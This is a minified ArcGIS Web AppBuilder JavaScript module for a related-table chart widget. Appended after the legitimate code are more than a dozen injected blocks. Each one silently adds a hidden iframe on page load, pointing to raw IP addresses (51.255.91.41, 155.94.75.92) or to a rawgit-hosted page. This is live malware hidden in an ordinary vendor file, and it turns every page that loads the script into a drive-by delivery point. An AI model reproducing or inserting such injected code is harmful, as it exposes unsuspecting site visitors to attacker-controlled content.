// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/RelatedTableCharts/ChartLayout.html":'\x3cdiv\x3e\r\n    \x3cdiv class\x3d"esriCTLayoutContent"\x3e\r\n        \x3cdiv class\x3d"esriCTLabels"\x3e\r\n            \x3cdiv class\x3d"esriCTLayoutHeaderTitle" data-dojo-attach-point\x3d"layoutHeaderTitle"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTChartContainer" data-dojo-attach-point\x3d"chartContainer"\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTLegendContainer" data-dojo-attach-point\x3d"legendContainer"\x3e\r\n            \x3cdiv data-dojo-attach-point\x3d"legendNode"\x3e\r\n            \x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTChartDescription" data-dojo-attach-point\x3d"chartDescription"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("jimu/BaseWidgetSetting jimu/utils dojo/dom-attr dojo/dom-construct dojo/dom-style dojo/_base/declare dojo/_base/lang dijit/_WidgetsInTemplateMixin dojo/text!./ChartLayout.html dojox/charting/Chart dojox/charting/plot2d/Pie dojox/charting/action2d/Tooltip dojox/charting/action2d/Highlight dojox/charting/action2d/MoveSlice dojox/charting/plot2d/Spider dojox/charting/widget/SelectableLegend dojox/charting/action2d/Magnify dojox/charting/plot2d/Bars dojox/charting/axis2d/Default".split(" "),function(q,
r,k,g,h,t,p,u,v,l,w,m,n,x,y,z,A){return t([q,u],{baseClass:"jimu-widget-RelatedTableCharts-layout",templateString:v,postCreate:function(){this.inherited(arguments)},startup:function(){this._createChartLayout()},_createChartLayout:function(){this._setNodeValue(this.layoutHeaderTitle,this.config.chartConfig.chartTitle,!0);this._setNodeValue(this.chartDescription,this.config.chartConfig.description,!1);this._initChart()},resizeChart:function(a){this.chart&&setTimeout(p.hitch(this,function(){"PieChart"!==
this.config.chartConfig.chartType?this.chart.resize():this._initChart();this.onChartResize()}),a)},_setNodeValue:function(a,c,b){var d=c;this.config.isPreview||(d=this._getFieldValues(c,this.config.selectedFeature.attributes));d?(d=r.sanitizeHTML(d),k.set(a,"innerHTML",d),b&&k.set(a,"title",d)):h.set(a,"display","none")},_initChart:function(){switch(this.config.chartConfig.chartType){case "BarChart":this._createBarChart();break;case "PieChart":this._createPieChart();break;case "PolarChart":this._createPolarChart();
break;default:k.set(this.chartContainer,"innerHTML",this.nls.errMsgNoFeaturesFound)}},_getBarChartContainerHeight:function(){var a=30;0<this.config.chartData.chartSeries.length&&(a=30*this.config.chartData.chartSeries.length);150>=a&&(a+=100);return a+"px"},_createBarChart:function(){var a,c={},b={};a=40;var d,f,e={};g.empty(this.chartContainer);a=this._getBarChartContainerHeight();a=new l(g.create("div",{style:"overflow:hidden; width:100%; height:"+a},this.chartContainer));a.addPlot("default",{type:"Bars",
gap:4,minBarSize:10,maxBarSize:15});b=h.get(this.chartDescription,"fontFamily");d=h.get(this.chartDescription,"fontSize");f=h.get(this.chartDescription,"color");c={labels:this.config.chartData.chartLabels,maxLabelCharCount:30,trailingSymbol:"...",natural:!0,majorTickStep:1,minorTicks:!1,fixUpper:!0,includeZero:!1,vertical:!0,titleFontColor:f,titleFont:"normal normal normal "+d+" "+b,font:"normal normal normal 9px "+b};b={fixLower:"major",fixUpper:"major",minorTicks:!1,includeZero:!0,titleFontColor:f,
titleFont:"normal normal normal "+d+" "+b,font:"normal normal normal 9px "+b};this.config.isPreview?(b.titleGap=5,c.majorTick={length:0},b.majorTick={length:0},c.majorLabels=!1,b.majorLabels=!1,c.minorLabels=!1,b.minorLabels=!1,c.title=this.config.chartConfig.labelYAxis,b.title=this.config.chartConfig.labelXAxis,e.stroke={width:0}):(new m(a,"default"),c.title=this._getFieldValues(this.config.chartConfig.labelYAxis,this.config.selectedFeature.attributes),b.title=this._getFieldValues(this.config.chartConfig.labelXAxis,
this.config.selectedFeature.attributes),e.stroke={width:1});b.titleOrientation="away";a.addAxis("y",c);a.addAxis("x",b);this.config.chartData.selectedTheme&&a.setTheme(this.config.chartData.selectedTheme);this.config.chartData.fill&&(e.fill=this.config.chartData.fill);a.addSeries(this.config.chartConfig.dataSeriesField,this.config.chartData.chartSeries,e,{plot:"default"});new n(a,"default");a.render();this.chart=a;this.onChartCreated()},_createPieChart:function(){var a,c={};g.empty(this.chartContainer);
a=g.create("div",{style:"width:100%; height:100%; overflow:auto"},this.chartContainer);a=new l(a);c={type:w,labels:!0,ticks:!0,fixed:!0,precision:0,labelWiring:"#ccc",labelStyle:"columns",htmlLabels:!0,startAngle:-10,maxLabelCharCount:20,trailingSymbol:"..."};"esriCTEmptyOption"===this.config.chartConfig.labelField&&(c.labels=!1);a.addPlot("default",c);this.config.isPreview||new m(a,"default");this.config.chartData.fill?a.addSeries(this.config.chartConfig.dataSeriesField,this.config.chartData.chartSeries,
{fill:this.config.chartData.fill},{plot:"default"}):a.addSeries(this.config.dataSeriesField,this.config.chartData.chartSeries,{plot:"default"});this.config.chartData.selectedTheme&&a.setTheme(this.config.chartData.selectedTheme);new x(a,"default");new n(a,"default");a.render();this.chart=a;this.onChartCreated()},_createPolarChart:function(){var a,c,b,d=.2,f=!1;this.chart&&this.chart.destroy();g.empty(this.chartContainer);h.set(this.chartContainer,"direction","inherit");a=g.create("div",{style:"width:100%; height:100%; overflow:hidden"},
this.chartContainer);b=h.get(this.chartDescription,"fontFamily");a=new l(a);this.config.chartConfig.showPolygonFill||(d=0);a.addPlot("default",{type:y,labelOffset:-10,divisions:5,seriesFillAlpha:d,markerSize:3,precision:0,spiderType:"polygon",axisFont:"normal normal normal 9px/25px "+b});this.config.chartData.selectedTheme?a.setTheme(this.config.chartData.selectedTheme):this.config.chartConfig.chartColor.colorInfo&&this.config.chartConfig.chartColor.colorInfo.layerField&&(f=!0);for(d=0;d<this.config.chartData.chartSeries.length;d++)for(c in b=
this.config.chartData.chartSeries[d],b)b.hasOwnProperty(c)&&(this.config.chartData.fill?a.addSeries(c,b[c],{fill:this.config.chartData.fill}):b[c].fill?a.addSeries(c,b[c],{fill:b[c].fill,legend:b[c].legendLabel}):a.addSeries(c,b[c]));this.config.isPreview||new m(a,"default");new n(a,"default");new A(a,"default",{duration:800,scale:1.5});a.render();this.chart=a;!this.config.isPreview&&f&&(h.set(this.legendContainer,"display","block"),this._createChartLegend(a));this.onChartCreated()},_createChartLegend:function(a){setTimeout(p.hitch(this,
function(){this.legend&&(this.legend.destroy(),this.legend=null);g.empty(this.legendNode);this.legend=new z({chart:a,horizontal:!0},g.create("div",{},this.legendNode))}),1500)},onChartCreated:function(){},onChartResize:function(){},_getFieldValues:function(a,c){var b="",d,f,e;a=a.replace(/(\n|\r|\r\n)/g,"\x3cbr\x3e");d=a.split("{");for(f=0;f<d.length;f++)if(0===f)b+=d[f];else if(-1!==d[f].indexOf("}"))for(a=d[f].split("}"),e=0;e<a.length;e++)if(0===e){if(c[a[e]]||0===c[a[e]])b+=c[a[e]]}else b=1===
e?b+a[e]:b+("}"+a[e]);else b+="{";return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});